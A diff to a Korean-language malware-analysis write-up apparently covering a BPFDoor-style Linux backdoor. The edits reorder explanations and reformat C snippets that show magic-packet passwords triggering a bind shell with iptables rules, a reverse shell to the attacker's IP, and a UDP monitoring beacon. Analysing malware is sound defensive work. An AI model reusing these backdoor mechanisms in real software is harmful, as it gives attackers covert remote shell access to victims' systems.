@@ -258,18 +258,6 @@ if (size_ip < 20) continue;
         ```
 
         - 앞에서 추출한 IP 헤더의 vhl(버전 4bit + 헤더 길이 4bit) 중 헤더 길이만을 추출하기 위해 하위 4비트(0x0f)를 AND 연산하여 **IP 헤더 길이를 4바이트 워드 단위로 나타낸 값 반환한다.**
-        - 예시
-
-            ```
-            ip_vhl = 0x45 (0100 0101)
-            version: 0100
-            header len: 0101
-
-              0100 0101  (ip_vhl)
-            & 0000 1111  (0x0F)
-            -----------
-              0000 0101  (결과: 0x05)
-            ```
 
     - 반환된 헤더 길이에 `* 4` 연산을 해주어 4바이트 단위 길이로 나타냄. 최종적으로 IP 헤더 길이가 바이트 단위의 길이로 변환된다.
 
@@ -468,7 +456,6 @@ if (mp) {
     - 내부에서 호출되는 핵심 함수 `getshell`, `try_link`, `shell`, `mon` 함수 분석은 다음 토글에 설명한다.
 
     1. `case 1:` - 비밀번호: `socket`
-        - IPTables 규칙을 설정하고, Bind Shell을 제공하는 것이 목적이다.
 
         ```c
         strcpy(sip, inet_ntoa(ip->ip_src));
@@ -476,11 +463,11 @@ if (mp) {
         break;
         ```
 
+        - IPTables 규칙을 설정하고, Bind Shell을 제공하는 것이 목적이다.
         - `inet_ntoa()` 함수를 통해 패킷의 출발지 IP 주소, 즉 패킷을 전송한 공격자의 IP 주소를 Dotted-Decimal Notation(사람이 읽을 수 있는 형태의 IP 주소 e.g. 192.168.1.102)으로 바꾸어 char 배열 `sip` 변수에 저장한다.
         - 앞에서 구한 `sip` 변수와 TCP 헤더에 포함되어 있던 목적지 port 값을 big-endian 에서 little-endian으로 변환한 값을 인자로 하여 `getshell` 함수를 실행한다.
 
     2. `case 0:` - 비밀번호: `justforfun`
-        - 공격자에게 Reverse Shell을 제공하는 것이 목적이다.
 
         ```c
         scli = try_link(bip, mp->port);
@@ -489,17 +476,18 @@ if (mp) {
         break;
         ```
 
+        - 공격자에게 Reverse Shell을 제공하는 것이 목적이다.
         - `try_link()` 함수를 호출하여 앞에서 정하였던 공격 대상 ip 주소(`bip`)와 `magic_packet`에 지정되어 있는 포트(공격 대상 포트, `mp→port`)를 인자로 전달한다.
         - 해당 함수로부터 반환 받은 소켓 파일 디스크립터를 `int scli` 변수에 저장하고, 정상적으로 소켓이 생성되었다면 `shell` 함수를 통해 통신을 시도한다. 이때, 두 개의 인자 모두 `NULL`로 전달한다.
 
     3. `case 2:` - 비밀번호 불일치
-        - 프로세스가 정상적으로 동작 중인지를 모니터링하기 위한 목적이다.
 
         ```c
         mon(bip, mp->port);
         break;
         ```
 
+        - 프로세스가 정상적으로 동작 중인지를 모니터링하기 위한 목적이다.
         - `mon` 함수에 대한 인자로 공격 대상 ip 주소(`bip`)와 `magic_packet`에 지정되어 있는 포트(공격 대상 포트, `mp→port`)를 전달하여 호출한다.
 
 <br>
@@ -530,15 +518,8 @@ if (mp) {
 
 5. **연결 시도**
 
-    ```c
-    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr)) == -1 ) {
-        close(sock);
-        return -1;
-    }
-    return sock;
-    ```
+    - 생성된 소켓을 사용하여 원격 서버에 연결을 시도한다.
 
-    - 생성된 소켓 `socket`을 사용하여 `serv_addr`에 지정된 원격 서버에 연결을 시도한다.
     - 연결 시도에 실패하면 소켓을 닫고 `-1`을 반환, 연결에 성공하면 연결이 설정된 소켓의 파일 디르크립터인 `sock`을 반환한다. 이 소켓은 이후 `shell` 함수를 통해 통신하는 데에 사용된다.
 
 <br>
@@ -562,7 +543,7 @@ if (mp) {
 
     ```c
     if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < -1) {
-            return -1;
+        return -1;
     }
     ```
 
@@ -577,8 +558,8 @@ if (mp) {
 
     ```c
     if ((s_len = sendto(sock, "1", 1, 0, (struct sockaddr *)&remote, sizeof(struct sockaddr))) < 0) {
-    		    close(sock);
-    		    return -1;
+        close(sock);
+        return -1;
     }
     ```
 
